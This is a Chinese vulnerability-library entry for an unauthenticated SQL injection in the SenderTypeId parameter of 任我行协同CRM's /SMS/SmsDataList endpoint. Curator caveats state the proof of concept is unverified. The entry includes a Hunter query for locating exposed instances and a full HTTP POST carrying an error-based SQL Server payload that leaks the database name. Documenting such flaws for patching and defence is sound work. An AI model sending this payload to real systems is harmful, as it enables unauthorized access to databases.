---
source: "wy876 漏洞文库"
title: "任我行协同CRM SmsDataList SenderTypeId SQL注入"
product: "任我行协同CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，版本未知"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/qng5bs4r6v7vunkw"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BB%BB%E6%88%91%E8%A1%8C/%E4%BB%BB%E6%88%91%E8%A1%8C%E5%8D%8F%E5%90%8CCRMSmsDataListSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"任我行 CRM\""
id: "vw-6fc76d5fabdc3812510b69ff"
entity_id: "ve-6fc76d5fabdc3812510b69ff"
schema_version: "1"
---

# 任我行协同CRM SmsDataList SenderTypeId SQL注入

## 条目说明

- 对象与具体问题：任我行协同CRM；SmsDataList SenderTypeId SQL注入
- 版本、配置及部署条件：SQL Server，版本未知
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content-Length23与百余字符正文明显冲突，手工请求不可照用
- 无实际数据库名回显，系统权限是条件性扩展；Hunter元数据误FOFA
- 保留匿名断言待核和原始来源

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
任我行CRM是CRM（客户关系管理）、OA（自动化办公）、OM（目标管理）、KM（知识管理）、HR（人力资源）一体化的企业管理软件。通过建立组织运营管理铁三角（目标行动-企业文化-知识复制），一切围绕以客户为中心的全方位、透明化业务管理（市场-销售-生产-服务），打造企业组织高效协同的运营管理平台。任我行协同CRM存在SQL注入漏洞，远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限。

## 二、影响版本
+ 任我行协同CRM

## 三、资产测绘
+ hunter`app.name="任我行 CRM"`
+ 登录页面


## 四、漏洞复现
```http
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Host: {hostname}
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate

Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(db_name())) AND 'CvNI'='CvNI
```

> 请求长度说明：原资料 Content-Length 为 23；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qng5bs4r6v7vunkw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
